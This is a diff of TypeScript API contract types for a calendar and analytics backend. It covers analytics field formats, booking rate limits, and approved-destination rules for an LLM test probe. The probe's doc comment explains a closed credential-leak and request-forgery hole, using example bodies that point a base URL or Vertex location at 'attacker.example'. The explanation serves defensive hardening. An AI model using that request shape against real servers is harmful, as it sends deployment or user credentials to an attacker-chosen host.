@@ -41,7 +41,7 @@ export type AnalyticsBreakdownEntry = {
   category: ("meeting" | "focus" | "habit" | "personal" | "free");
   minutes: number;
   /**
-   * `minutes / total_working_minutes * 100`, or 0 when total is 0. Not rounded. Note buffer_minutes is excluded from the breakdown, so the five percentages need not sum to 100.
+   * A percentage where 100 means the whole of `total_working_minutes` (PAC-42: the same scale as `habit_completion_rate` and `focus_score` in the same response): `minutes / total_working_minutes * 100`, or 0 when total is 0. Not rounded. No maximum is declared because the value is not bounded by 100: the total counts Monday–Friday working windows only, while meeting and personal minutes count every timed event in the seven days at any hour. buffer_minutes is excluded from the breakdown, so the five percentages need not sum to 100.
    */
   percentage: number;
   color: string;
@@ -68,28 +68,30 @@ export type AnalyticsRecomputeAck = { status: "recompute accepted" }
  */
 export type MeetingTitle = { title: string, duration_minutes: number }
 /**
- * Raw `storage.AnalyticsWeek` as returned by GET /api/analytics/trends. Same field
- * set as AnalyticsWeekWithBreakdown minus `breakdown`, and with `week_start`
- * serialised as a full RFC3339 timestamp because the Go field is a `time.Time`.
+ * One item of GET /api/analytics/trends. Same fields as AnalyticsWeekWithBreakdown,
+ * in the same formats and on the same scales, minus `breakdown` (PAC-42).
  */
 export type AnalyticsWeekRow = {
   id: string;
   user_id: string;
   /**
-   * Midnight UTC of the Monday, e.g. "2026-03-02T00:00:00Z" — NOT the "2026-03-02" shape used by /api/analytics/week.
+   * The calendar date of the Monday the week starts on, `YYYY-MM-DD` (e.g. "2025-01-06"), with no time of day and no zone: the stored DATE value. Same format as AnalyticsWeekWithBreakdown.week_start, so the two are equal strings for the same week (PAC-42, API-055; this was an RFC3339 timestamp before). Never the zero date "0001-01-01" (PAC-42 fixes the read path that produced it).
    */
   week_start: string;
   total_working_minutes: number;
   meeting_minutes: number;
   focus_minutes: number;
   habit_minutes: number;
+  /**
+   * Always 0 for engine-computed weeks (open defect API-057); see AnalyticsWeekWithBreakdown.buffer_minutes.
+   */
   buffer_minutes: number;
   personal_minutes: number;
   free_minutes: number;
   meeting_count: number;
   focus_block_count: number;
   /**
-   * 0..1 fraction.
+   * A percentage where 100 means every counted habit occurrence was completed (PAC-42, API-058; reported unscaled before PAC-42): `completed / (scheduled + completed) * 100`, 0 when there are none, not rounded. Equal to the single-week value for the same stored week. Rows stored before PAC-42 are reported on this scale too: storage keeps the unscaled ratio for every week and the multiplication by 100 is applied on read (spec D-3).
    */
   habit_completion_rate: number;
   largest_focus_block_minutes: number;
@@ -97,20 +99,22 @@ export type AnalyticsWeekRow = {
    * `[]` when the week has no titles, including when the JSONB column holds `null` or fails to unmarshal (PAC-28).
    */
   top_meeting_titles: Array<MeetingTitle>;
+  /**
+   * A percentage where 100 means all focus and meeting time was focus; same computation and range as AnalyticsWeekWithBreakdown.focus_score.
+   */
   focus_score: number;
   estimated_meeting_cost_minutes: number;
   computed_at: string;
 }
 /**
- * Response of GET /api/analytics/week. Built by `weekWithBreakdown` as a
- * `map[string]any`, so it deliberately differs from AnalyticsWeekRow: `week_start`
- * is a plain date string and `breakdown` is added.
+ * Response of GET /api/analytics/week. The same fields as AnalyticsWeekRow, in the
+ * same formats and on the same scales, plus `breakdown` (PAC-42).
  */
 export type AnalyticsWeekWithBreakdown = {
   id: string;
   user_id: string;
   /**
-   * The Monday of the week, formatted "2006-01-02". DIFFERENT from the trends endpoint, which emits a full timestamp.
+   * The calendar date of the Monday the week starts on, `YYYY-MM-DD` (e.g. "2025-01-06"), with no time of day and no zone: the stored DATE value. Same format as AnalyticsWeekRow.week_start, so the two are equal strings for the same week (PAC-42, API-055). Never the zero date "0001-01-01" (PAC-42 fixes the read path that produced it).
    */
   week_start: string;
   /**
@@ -121,7 +125,7 @@ export type AnalyticsWeekWithBreakdown = {
   focus_minutes: number;
   habit_minutes: number;
   /**
-   * Never populated by `compute` — the engine leaves it at 0 in every write path.
+   * Always 0 for engine-computed weeks: AnalyticsEngine.compute never sets it, so every write path stores 0. This is open defect API-057 (docs/factory/api-audit.md), not intended behaviour; computing it is out of PAC-42's scope (spec D-5, pending owner confirmation, OQ-8). The column round-trips through storage, so a row written by other means would report its stored value.
    */
   buffer_minutes: number;
   /**
@@ -135,13 +139,13 @@ export type AnalyticsWeekWithBreakdown = {
   meeting_count: number;
   focus_block_count: number;
   /**
-   * completed / (scheduled + completed) occurrences in the week, as a 0..1 FRACTION (not a percentage). 0 when there are none.
+   * A percentage where 100 means every counted habit occurrence was completed (PAC-42, API-058: the same scale as `focus_score` and `breakdown[].percentage` in this response): `completed / (scheduled + completed) * 100` over the week's occurrences. 0 when there are none. Not rounded. Storage keeps the unscaled ratio; the multiplication by 100 is applied when the response is built (spec D-3).
    */
   habit_completion_rate: number;
   largest_focus_block_minutes: number;
   top_meeting_titles: Array<MeetingTitle>;
   /**
-   * `focus*100/(focus+meeting)` clamped to ≤100; 50 when both are 0.
+   * A percentage where 100 means all focus and meeting time was focus: `focus*100/(focus+meeting)` (integer division) clamped to ≤100; 50 when both are 0.
    */
   focus_score: number;
   /**
@@ -225,7 +229,7 @@ export type AuthStatusResponse = {
   email: string;
 }
 /**
- * Shared error envelope written by api.writeError (handlers_settings.go:206): Content-Type application/json, body `{"error": "<message>"}`. The one exception in this domain is the requireAuth 401 (text/plain). Every 5xx, including the Zoom OAuth callback's, is this envelope (PAC-21).
+ * Shared error envelope written by api.writeError (handlers_settings.go:388): Content-Type application/json, body `{"error": "<message>"}`. The one exception in this domain is the requireAuth 401 (text/plain). Every 5xx, including the Zoom OAuth callback's, is this envelope (PAC-21).
  */
 export type BookingError = {
   /**
@@ -233,6 +237,10 @@ export type BookingError = {
    */
   error: string;
 }
+/**
+ * The `BookingError` envelope with its one possible message pinned, so a client can tell a rate-limit refusal from every other error by status and body alone (NEW-booking-rate-limit). Written by api.writeError.
+ */
+export type BookingRateLimitError = { error: "rate limit exceeded" }
 /**
  * engine.CadenceGap.
  */
@@ -1040,7 +1048,7 @@ export type InviteSchedulingLinkHostRequest = {
   email: string;
 }
 /**
- * PAC-66. Body of the 422 from POST /api/llm/test: the probe would have sent the deployment's cloud credential to a destination the operator has not approved, so no inference request was sent. A superset of `SchedulingErrorResponse` (`error` is the same member, so a client that reads only `error`, as the web settings page does, renders it unchanged). Never carries a token, a key or any part of the deployment credential (spec AC-11).
+ * PAC-66 and PAC-66-B. Body of the 422 from POST /api/llm/test: the probe would have sent the deployment's cloud credential, the caller's own key, or a keyless Ollama request to a destination not approved for that provider, so no inference request was sent. A superset of `SchedulingErrorResponse` (`error` is the same member, so a client that reads only `error`, as the web settings page does, renders it unchanged). Never carries a token, a key or any part of the deployment credential (spec AC-11).
  */
 export type LLMDestinationRefusal = {
   /**
@@ -1048,13 +1056,13 @@ export type LLMDestinationRefusal = {
    */
   error: string;
   /**
-   * `provider_not_enabled`: the operator approved no host for this provider (spec AC-4, AC-18 b). It wins over the other two: when nothing is approved for the provider, this is the reason whatever is stored. `destination_not_approved`: the effective host, over `https` on the default port, is not approved for this provider. This includes an `http` endpoint, an explicit non-443 port, a host approved only for a DIFFERENT provider, and an empty Vertex location or Bedrock region whose built-in default region's host is not approved (spec AC-1, AC-2, AC-7, AC-16, AC-18 a/c, AC-19). `destination_not_set`: the destination cannot be built because the stored value is empty and the provider has no default; today only an empty `azureEndpoint` (spec AC-20).
+   * `provider_not_enabled`: the operator approved no host for this provider (spec AC-4, AC-18 b). It wins over the other two: when nothing is approved for the provider, this is the reason whatever is stored. PAC-66-B: `ollama` with no origin in `PACEDAY_LLM_APPROVED_ORIGINS_OLLAMA` (spec AC-B8). Never given for `openai` or `anthropic`, whose public hosts are always approved. `destination_not_approved`: the effective host, over `https` on the default port, is not approved for this provider. This includes an `http` endpoint, an explicit non-443 port, a host approved only for a DIFFERENT provider, and an empty Vertex location or Bedrock region whose built-in default region's host is not approved (spec AC-1, AC-2, AC-7, AC-16, AC-18 a/c, AC-19). PAC-66-B: the effective destination of `openai`, `anthropic` or `ollama` is not approved for that provider. This includes a base URL carrying a path, a query, a fragment, userinfo or whitespace; an `http` scheme or a non-default port on `openai` / `anthropic`; a scheme, host or port differing from an approved Ollama origin; a destination approved only for a different provider; and Ollama's built-in default `http://localhost:11434` when it is not approved (spec AC-B1, AC-B2, AC-B6, AC-B9, AC-B10, AC-B11, AC-B18, AC-B19). `destination_not_set`: the destination cannot be built because the stored value is empty and the provider has no default; today only an empty `azureEndpoint` (spec AC-20).
    */
   reason: ("provider_not_enabled" | "destination_not_approved" | "destination_not_set");
   /**
-   * The stored setting the refused destination was built from. Present whenever `reason` is not `provider_not_enabled`. `awsProfile` only when the Bedrock host came from that profile's endpoint configuration rather than from the region.
+   * The stored setting the refused destination was built from. Present whenever `reason` is not `provider_not_enabled`. `awsProfile` only when the Bedrock host came from that profile's endpoint configuration rather than from the region. PAC-66-B: `llmBaseUrl` on `openai` and `anthropic`, and on `ollama` when the effective destination came from it (`ollamaBaseUrl` empty); `ollamaBaseUrl` on `ollama` otherwise, including when both are empty and the built-in `http://localhost:11434` was refused, since that is the setting the user would save an approved origin in.
    */
-  property?: ("azureEndpoint" | "gcpLocation" | "awsRegion" | "awsProfile");
+  property?: ("azureEndpoint" | "gcpLocation" | "awsRegion" | "awsProfile" | "llmBaseUrl" | "ollamaBaseUrl");
 }
 /**
  * Optional body for POST /api/llm/test. Added by PAC-24 to close API-037.
@@ -1065,7 +1073,7 @@ export type LLMDestinationRefusal = {
  */
 export type LLMTestRequest = Partial<{
   /**
-   * Which provider branch of `nlp.NewLLMClientFromSettings` to probe. Selects the client; it does not select a host. On `openai` and `anthropic` the host is the caller's stored `llmBaseUrl` (or the vendor default when that is empty); on the other four it is built entirely from the caller's stored endpoint properties. Spec AC-15. PAC-66: on `azure_openai`, `vertex` and `bedrock` the operator's approved-host check follows THIS value when present, not the stored provider, so naming an ambient provider here for one probe is checked exactly as if it were saved (spec AC-18; a 422 when refused). Nothing submitted here is stored.
+   * Which provider branch of `nlp.NewLLMClientFromSettings` to probe. Selects the client; it does not select a host. On `openai` and `anthropic` the host is the caller's stored `llmBaseUrl` (or the vendor default when that is empty); on `ollama` it is the stored `ollamaBaseUrl`, then `llmBaseUrl`, then `http://localhost:11434`; on the other three it is built entirely from the caller's stored endpoint properties. Spec AC-15. PAC-66: on `azure_openai`, `vertex` and `bedrock` the operator's approved-host check follows THIS value when present, not the stored provider, so naming an ambient provider here for one probe is checked exactly as if it were saved (spec AC-18; a 422 when refused). PAC-66-B: the same holds on `openai`, `anthropic` and `ollama`, so naming `openai` for one probe while the stored `llmBaseUrl` is approved only for Ollama is a 422 and sends no key (spec AC-B11). Nothing submitted here is stored.
    */
   llmProvider: ("" | "openai" | "anthropic" | "ollama" | "bedrock" | "azure_openai" | "vertex");
   /**
@@ -1073,7 +1081,7 @@ export type LLMTestRequest = Partial<{
    */
   llmModel: string;
   /**
-   * An unsaved key to probe. Used only as the `Authorization` header value sent to the caller's stored endpoint (`backend/nlp/parser.go:43`). Ignored by the four branches that take no key. Never persisted and never echoed (spec AC-14).
+   * An unsaved key to probe. Used only as the `Authorization` header value (`openai`) or the `x-api-key` header value (`anthropic`) (`backend/nlp/parser.go:45,80`), sent only to a destination approved for that provider (PAC-66-B). Ignored by the four branches that take no key. Never persisted and never echoed (spec AC-14).
    */
   llmApiKey: string;
 }>
@@ -2005,7 +2013,7 @@ export type Settings = {
    */
   llmApiKeySet: boolean;
   /**
-   * Also the legacy fallback for the ollama base URL.
+   * Base URL of the `openai` or `anthropic` destination; `""` means the vendor's public host (`https://api.openai.com`, `https://api.anthropic.com`). Also Ollama's fallback when `ollamaBaseUrl` is `""`. PAC-66-B: a write changing it to a non-empty value must be exactly `<scheme>://<host>[:<port>]` (at most one trailing `/`) and approved for at least one of `openai`, `anthropic`, `ollama` (400 otherwise); a request is sent to it only for a provider it is approved for (see `testLLMConnection`). The web app writes this property from its Ollama field. No `pattern`, for the reason given on `awsRegion`.
    */
   llmBaseUrl: string;
   /**
@@ -2030,7 +2038,7 @@ export type Settings = {
   gcpLocation: string;
   vertexModel: string;
   /**
-   * Falls back to llmBaseUrl, then `http://localhost:11434`.
+   * Falls back to llmBaseUrl, then `http://localhost:11434`. Stored as `http://localhost:11434` on a new account (migration 002), so it is Ollama's destination until cleared. PAC-66-B: a write changing it to a non-empty value must be exactly `<scheme>://<host>[:<port>]` (at most one trailing `/`) and an origin approved in `PACEDAY_LLM_APPROVED_ORIGINS_OLLAMA` (400 otherwise); the same check is made whenever an Ollama request would be sent. No `pattern`, for the reason given on `awsRegion`.
    */
   ollamaBaseUrl: string;
   /**
@@ -2185,7 +2193,7 @@ export type SettingsUpdate = Partial<{
    */
   llmApiKeySet: boolean;
   /**
-   * Also the legacy fallback for the ollama base URL.
+   * Base URL of the `openai` or `anthropic` destination; `""` means the vendor's public host (`https://api.openai.com`, `https://api.anthropic.com`). Also Ollama's fallback when `ollamaBaseUrl` is `""`. PAC-66-B: a write changing it to a non-empty value must be exactly `<scheme>://<host>[:<port>]` (at most one trailing `/`) and approved for at least one of `openai`, `anthropic`, `ollama` (400 otherwise); a request is sent to it only for a provider it is approved for (see `testLLMConnection`). The web app writes this property from its Ollama field. No `pattern`, for the reason given on `awsRegion`.
    */
   llmBaseUrl: string;
   /**
@@ -2210,7 +2218,7 @@ export type SettingsUpdate = Partial<{
   gcpLocation: string;
   vertexModel: string;
   /**
-   * Falls back to llmBaseUrl, then `http://localhost:11434`.
+   * Falls back to llmBaseUrl, then `http://localhost:11434`. Stored as `http://localhost:11434` on a new account (migration 002), so it is Ollama's destination until cleared. PAC-66-B: a write changing it to a non-empty value must be exactly `<scheme>://<host>[:<port>]` (at most one trailing `/`) and an origin approved in `PACEDAY_LLM_APPROVED_ORIGINS_OLLAMA` (400 otherwise); the same check is made whenever an Ollama request would be sent. No `pattern`, for the reason given on `awsRegion`.
    */
   ollamaBaseUrl: string;
   /**
@@ -2646,9 +2654,12 @@ export type post_RecomputeAnalytics = {
 /**
  * Reads previously persisted rows only — it never computes. Ordered
  * `week_start DESC` (newest first). A nil slice is normalised to `[]`.
- * Items are the RAW `storage.AnalyticsWeek` struct, which differs from
- * /api/analytics/week: `week_start` is a full RFC3339 timestamp here, and there is
- * no `breakdown` field.
+ * Each item has the same fields as the GET /api/analytics/week response, in the
+ * same formats and on the same scales, minus `breakdown` (PAC-42): `week_start` is
+ * the calendar date of the week's Monday (`YYYY-MM-DD`), and `habit_completion_rate`
+ * and `focus_score` are percentages where 100 means the whole. The `breakdown`
+ * array exists only on /api/analytics/week (API-055 second half, out of PAC-42's
+ * scope).
  */
 export type get_ListAnalyticsTrends = {
       method: "GET",
@@ -2672,8 +2683,12 @@ export type get_ListAnalyticsTrends = {
  * The week is the Monday-anchored week containing `date`. A cached row is returned
  * when it was computed within the last 24h, otherwise the week is recomputed and
  * upserted synchronously (this call may hit the Google Calendar API).
- * The response is a hand-built map, not the raw `storage.AnalyticsWeek` struct, so
- * its `week_start` is a plain date and it carries an extra `breakdown` array.
+ * The response carries the same fields as a GET /api/analytics/trends row, in the
+ * same formats and on the same scales, plus a `breakdown` array (PAC-42):
+ * `week_start` is the calendar date of the week's Monday (`YYYY-MM-DD`), equal
+ * byte for byte to the trend row for the same week, and every proportion in the
+ * response (`habit_completion_rate`, `focus_score`, each `breakdown[].percentage`)
+ * is a percentage where 100 means the whole.
  */
 export type get_GetAnalyticsWeek = {
       method: "GET",
@@ -2689,7 +2704,6 @@ export type get_GetAnalyticsWeek = {
           }
       responses: {200: Schemas.AnalyticsWeekWithBreakdown,
 401: Schemas.ErrorResponse,
-404: Schemas.ErrorResponse,
 500: Schemas.ErrorResponse,
 },
       
@@ -3250,6 +3264,9 @@ export type get_GetPublicLinkInfo = {
 },
       
     }
+/**
+ * Rate limited per client (NEW-booking-rate-limit). A client may make at most 20 requests to this operation per fixed 10-minute window; the window starts at the client's first counted request and is not extended by refused requests. The limit is checked and the request counted atomically, as the very first step of the handler: before the link lookup, before the body is read and before any validation, so every request counts whatever it would otherwise have answered (201, 400, 404, 409, 410, 422 or 500), and a refused request answers 429 even for an unknown slug and never writes a booking. Concurrent requests cannot exceed the limit. The count is per client across all links, not per link or per host, and is separate from the slot-listing budget of `getPublicBookingSlots`. A client is identified exactly as for `detectAuthProvider` (PAC-39): the socket peer address, or the `X-Real-IP` header only when the socket peer is inside `TRUSTED_PROXIES` (comma-separated IPs or CIDRs; empty or unset trusts nobody; an unparseable entry trusts less, never more). `X-Forwarded-For` is never read. A client is one exact IPv4 or IPv6 address, with no prefix grouping. Counts live in process memory: the limit is per backend process (20 per replica, as API-062's residue), and a restart clears them. Clients whose window has ended are forgotten by a sweep that runs on a request, at most once per window, so memory stays bounded. CORS preflight (`OPTIONS`) is answered by the CORS middleware and is not counted. Not checked (API-094, open): the requested time is never checked against the hosts' availability, the link's days or hours, or any upper date bound. The only time checks are the minimum notice (422) and overlap with this link's own non-cancelled bookings (409); any other start is accepted. The booking row is saved, then a calendar event (with the booker email as a guest) is attempted on each accepted host's calendar, best effort: a host whose user record or calendar client cannot be loaded is skipped and a failed event creation is ignored, so a 201 does not mean any host's calendar was written. Operation-level `security: []` is kept: this operation is public and is registered outside requireAuth; the rate limit is not authentication.
+ */
 export type post_CreatePublicBooking = {
       method: "POST",
       path: "/api/book/{slug}",
@@ -3268,12 +3285,14 @@ export type post_CreatePublicBooking = {
 409: Schemas.BookingError,
 410: Schemas.BookingError,
 422: Schemas.BookingError,
+429: Schemas.BookingRateLimitError,
 500: Schemas.BookingError,
 },
-      
+      responseHeaders: {429: { "Retry-After": number },
+},
     }
 /**
- * Two distinct modes. With `date`: `slots` is populated and `available_dates` is always the empty array. Without `date`: the handler probes the next 60 calendar days from `time.Now()` and returns those day strings in `available_dates`, with `slots` always the empty array. Both keys are always present in both modes.
+ * Two distinct modes. With `date`: `slots` is populated and `available_dates` is always the empty array. Without `date`: the handler probes the next 60 calendar days from `time.Now()` and returns those day strings in `available_dates`, with `slots` always the empty array. Both keys are always present in both modes. Rate limited per client (NEW-booking-rate-limit), separately from and more loosely than `createPublicBooking`: at most 120 requests per client per fixed 1-minute window, with or without `date`. The limit is checked and the request counted atomically as the handler's first step, before the link lookup and before the query is validated, so every request counts whatever it would otherwise have answered, and a refused request answers 429 even for an unknown slug. Booking requests do not consume this budget and slot requests do not consume the booking budget. Client identification, the per-process caveat, the sweep and the CORS preflight exemption are exactly as described on `createPublicBooking`; this limiter has its own counts and its own sweep.
  */
 export type get_GetPublicBookingSlots = {
       method: "GET",
@@ -3291,9 +3310,11 @@ export type get_GetPublicBookingSlots = {
 400: Schemas.BookingError,
 404: Schemas.BookingError,
 410: Schemas.BookingError,
+429: Schemas.BookingRateLimitError,
 500: Schemas.BookingError,
 },
-      
+      responseHeaders: {429: { "Retry-After": number },
+},
     }
 /**
  * Reads the authenticated user's primary Google calendar (calendar.CalendarClient.CalendarID, hardcoded to "primary" in backend/calendar/client.go) and flattens each event into the frontend-facing CalendarEvent shape. Room resource attendees (`*@resource.calendar.google.com`) are dropped from both `attendees` and `attendee_details`.
@@ -3956,9 +3977,9 @@ export type get_GetSlackStatus = {
  * Probes a provider configuration by issuing a fixed completion (system "You are a helpful assistant.", user "Say hello").
  * PAC-24 resolves API-037. **THE DESTINATION IS NEVER SUPPLIED BY THE CALLER.** Every value that contributes to the URL this server requests — `llmBaseUrl`, `ollamaBaseUrl`, `azureEndpoint`, `azureDeployment`, `azureApiVersion`, `awsRegion`, `awsProfile`, `bedrockModel`, `gcpProject`, `gcpLocation`, `vertexModel` — is read from the CALLER'S OWN stored settings and from nowhere else. The request body may carry only `llmProvider`, `llmModel` and `llmApiKey`, none of which reaches a URL (`backend/nlp/llm_factory.go:13-58`: `llmModel` is consulted only by the `openai` and `anthropic` branches, where it is a JSON body field, and `llmApiKey` only as an `Authorization` header value).
  * This is a security property of the contract, not a convenience, and the invariant is: **a credential the caller did not supply is never sent to a destination the caller did supply — because the caller cannot supply a destination at all.** An earlier draft of this contract let a body override each endpoint property individually with per-property fallback to the stored values. That let `{"llmProvider":"openai","llmBaseUrl":"https://attacker.example"}` pair a caller-chosen host with the stored key: `nlp.NewLLMClientFromSettings` builds `OpenAIClient{APIKey: s.LLMAPIKey, BaseURL: s.LLMBaseURL}` (`backend/nlp/llm_factory.go:29`) and `OpenAIClient.Complete` POSTs to `base + "/v1/chat/completions"` with `Authorization: Bearer <key>` (`backend/nlp/parser.go:31,43`), so the stored key would leave the deployment and the 200/502 would confirm delivery. An all-or-nothing body (supply the endpoint AND the key together) does not close it either: on the `azure_openai`, `bedrock` and `vertex` branches the credential is AMBIENT and cannot be submitted — `AzureOpenAIClient.Complete` mints a token with `azidentity.NewDefaultAzureCredential` and sends it as `Authorization: Bearer <token>` to `c.Endpoint` (`backend/nlp/llm_azure_openai.go:28-50`) — so any submitted endpoint is necessarily paired with a credential the caller did not supply. Refusing submitted destinations outright is the only shape that holds for all six providers.
- * What the body IS for: verifying a key that has not been saved, now that a stored key can never be read back (see `SettingsUpdate.llmApiKey`), and naming which provider the result is about (spec AC-15). The body is REQUIRED (revision 3): `{}` probes the caller's stored configuration entirely - the pre-PAC-24 behaviour - and an absent body is a 400, as the generated server wrapper already makes it (contract challenge r2, finding 3). In the body, `""` is a value like any other: `llmApiKey: ""` probes with no key and `llmProvider: ""` probes with no provider, which reports `LLM not configured`.
+ * What the body IS for: verifying a key that has not been saved, now that a stored key can never be read back (see `SettingsUpdate.llmApiKey`), and naming which provider the result is about (spec AC-15). The body is REQUIRED (revision 3): `{}` probes the caller's stored configuration entirely - the pre-PAC-24 behaviour - and an absent body is a 400, as the generated server wrapper already makes it (contract challenge r2, finding 3). In the body, `""` is a value like any other: `llmApiKey: ""` probes with no key and `llmProvider: ""` probes with no provider, which is the 500 `{"error":"internal error"}` (the configuration sentence is logged only, PAC-21).
  * Before PAC-24 the handler never read r.Body at all and always probed the SINGLETON settings row, so this operation reported on the deployment's saved configuration rather than on the caller's (API-002, API-037).
- * No response on any status carries the submitted or the stored `llmApiKey`. The provider's own error text is still echoed on 502 — that is API-054 / T8 and is NOT resolved here; the narrower guarantee PAC-24 adds is that the key itself never appears (spec AC-14).
+ * No response on any status carries the submitted or the stored `llmApiKey` (PAC-24 spec AC-14). Since PAC-21 the 502 body is the fixed `upstream provider error` and no longer echoes the provider's own text (`backend/api/server_errors.go`); the detail goes to the server log only.
  * **PAC-66: the deployment's cloud identity goes only to hosts the OPERATOR approved.** PAC-24 left one indirect channel open: a caller could write `azureEndpoint` or `gcpLocation` into their OWN settings with `PATCH /api/settings` and then probe, and on the three ambient-credential providers (`azure_openai`, `vertex`, `bedrock`) the server sent the DEPLOYMENT'S cloud credential (an Entra ID token, a Google ADC token, an AWS SigV4 signature) to the host those values built (`backend/nlp/llm_azure_openai.go:28-50`, `llm_vertex.go:29-53`; a Vertex location such as `attacker.example/x` changes the URL's authority). PAC-66 closes it for those three providers:
  * * The operator names the approved inference hosts per provider in
  *   deployment configuration (`PACEDAY_LLM_APPROVED_HOSTS_AZURE_OPENAI`,
@@ -3994,7 +4015,55 @@ export type get_GetSlackStatus = {
  * * The check is made on every send, not only on write, so a value stored
  *   before PAC-66 is refused here too (spec AC-9).
  * 
- * The user-key and keyless providers (`openai`, `anthropic`, `ollama`) are unchanged by PAC-66: `llmBaseUrl` and `ollamaBaseUrl` still address any host, carrying the caller's own key or none. That request-forgery channel is PAC-66-B (spec §0, D-4). An approved host is approved whatever path, project, deployment or model the stored values put in the URL; that sibling problem is recorded in `contracts/features/PAC-66.md` §7, not solved here.
+ * For the three ambient providers an approved host is still approved whatever path, project, deployment or model the stored values put in the URL; that sibling problem is recorded in `contracts/features/PAC-66.md` §7 and is not solved by PAC-66 or PAC-66-B.
+ * **PAC-66-B: a user-set base URL goes only to a destination approved for the provider in use.** On the user-key and keyless providers (`openai`, `anthropic`, `ollama`) the destination is built from the caller's stored `llmBaseUrl` / `ollamaBaseUrl`. Before PAC-66-B any scheme, host, port, path or query was used verbatim, so a caller could make the server POST to any address it can reach and read the outcome as an oracle, and the server followed redirects, re-sending an Anthropic `x-api-key` to any host (spec §B1, §B2.4). PAC-66-B closes it (spec PAC-66 Part B; rationale in `contracts/features/PAC-70.md`):
+ * * **Approved destinations, per provider, never transferred** (spec
+ *   D-B1, D-B2, D-B3, D-B5). `openai`: `https://api.openai.com`, built in,
+ *   plus the hosts the operator lists in
+ *   `PACEDAY_LLM_APPROVED_HOSTS_OPENAI`. `anthropic`:
+ *   `https://api.anthropic.com`, built in, plus
+ *   `PACEDAY_LLM_APPROVED_HOSTS_ANTHROPIC`. Both only over `https` on the
+ *   default port. `ollama`: only the origins (scheme, host and port) the
+ *   operator lists in `PACEDAY_LLM_APPROVED_ORIGINS_OLLAMA`, where `http`
+ *   and a non-default port are allowed because Ollama carries no key;
+ *   nothing listed means Ollama is not enabled on this deployment (fail
+ *   closed). A destination approved for one provider is never a
+ *   destination for another, so a user's key never goes to an Ollama
+ *   origin (spec AC-B11). No request property and no stored setting can
+ *   add to any of these sets.
+ * 
+ * * **Effective destination** (spec §B4). `openai` / `anthropic`: the
+ *   stored `llmBaseUrl`, or the vendor's public host when it is `""`. A
+ *   non-empty value with no usable host (e.g. `http:/`) is refused, never
+ *   replaced by the public host. `ollama`: `ollamaBaseUrl`; when that is
+ *   `""`, `llmBaseUrl`; when both are `""`, `http://localhost:11434`. The
+ *   fallback order is unchanged (spec D-B9); an account's starting state
+ *   stores `ollamaBaseUrl` as `http://localhost:11434`, so the shared
+ *   `llmBaseUrl` is not Ollama's destination until `ollamaBaseUrl` is
+ *   cleared.
+ * 
+ * * **A base URL names a destination, not an operation** (spec D-B8). It
+ *   is usable only when it is exactly `<scheme>://<host>[:<port>]` with
+ *   at most one trailing `/`. Any other path, a `?` or `#` (even empty),
+ *   userinfo, or surrounding whitespace makes it not approved. The
+ *   request is sent to exactly the provider's chat operation on that
+ *   origin (`/v1/chat/completions`, `/v1/messages`, `/api/chat`) with no
+ *   query.
+ * 
+ * * **The check is made on every send, against the provider the probe
+ *   USES** (the body's `llmProvider` when present, otherwise the stored
+ *   one), before anything else about the request. A refusal is the 422
+ *   below and sends nothing, whether or not a key is on file or
+ *   submitted: an `openai` or `anthropic` probe with a refused destination
+ *   and no key is the 422, not the 500 (spec
+ *   "Refusal does not depend on the key"). A value stored before PAC-66-B
+ *   is refused here too and is never rewritten (spec AC-B14, D-B4).
+ * 
+ * * **A redirect is never followed** on these three providers, whatever
+ *   the status, target, method or query, including a redirect to another
+ *   approved destination. The request that drew it counts as failed (the
+ *   502 below), and the user's key appears only in that first request
+ *   (spec AC-B7, D-B6).
  */
 export type post_TestLLMConnection = {
       method: "POST",
@@ -4944,6 +5013,7 @@ export type get_GetSettings = {
  * 
  * The response is a fresh read of the caller's row, so it reflects normalisation (e.g. `workingHours` defaulting) rather than the submitted body, and it does not contain `llmApiKey`.
  * **PAC-66 destination rules.** When a write CHANGES `azureEndpoint`, `gcpLocation` or `awsRegion` to a non-empty value, that value is checked whichever provider is selected (spec AC-5, AC-7): `azureEndpoint` must be an `https` URL whose host is approved for `azure_openai`; `gcpLocation` must build a Vertex host approved for `vertex`; `awsRegion` must be a valid AWS region name (one host label; the Bedrock host itself is checked when a request is sent). A refused value is a 400 naming the property, and nothing in the body is stored. Three things are deliberately NOT refused here: `""` for any of the three (a user can always clear a bad value, spec AC-15, D-3); a value equal to the one already stored (the changed-only rule above, PAC-24 AC-17, spec AC-9); and a write that changes only `llmProvider`, even onto a stored unapproved endpoint (spec AC-17). Each of those is refused when a request would be sent instead (see `testLLMConnection`). The server never rewrites or clears a stored value (spec D-3).
+ * **PAC-66-B destination rules.** When a write CHANGES `llmBaseUrl` or `ollamaBaseUrl` to a non-empty value, that value is checked whichever provider is selected (spec AC-B3, AC-B4, AC-B18, AC-B19): it must be exactly `<scheme>://<host>[:<port>]` with at most one trailing `/`. `ollamaBaseUrl` must then be an origin approved for `ollama`. `llmBaseUrl` is read by all three of `openai`, `anthropic` and `ollama`, so it must be approved for AT LEAST ONE of them (the vendors' public hosts count; spec D-B5); being approved for one provider does not make it a destination for another, which is checked when a request would be sent. A refused value is a 400 naming the property, and nothing in the body is stored. As for PAC-66, `""` is always accepted (a user can always clear a bad value; clearing means the provider's fallback, spec §B4), an unchanged value is not re-checked, and a write that changes only `llmProvider` is not refused (spec AC-B14, D-B4).
  * Before PAC-24 there was no PATCH; the only write was a full-replace PUT that persisted every omitted field as its Go zero value (API-004).
  */
 export type patch_PatchSettings = {
